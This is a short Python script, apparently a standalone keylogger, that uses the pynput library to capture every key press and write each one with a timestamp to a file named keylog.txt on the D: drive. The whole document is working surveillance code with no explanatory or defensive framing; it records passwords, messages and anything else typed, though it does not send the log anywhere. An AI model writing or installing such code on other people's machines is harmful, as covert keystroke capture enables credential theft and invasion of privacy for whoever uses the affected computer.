import pynput
import logging
from pynput.keyboard import Key,Listener

log_dir = "D:/"
logging.basicConfig(filename=(log_dir + "keylog.txt"),level=logging.DEBUG,format="%(asctime)s: %(message)s")

def my_key_on_press(key):
    logging.info(str(key))

with Listener(on_press=my_key_on_press)as listener:
    listener.join()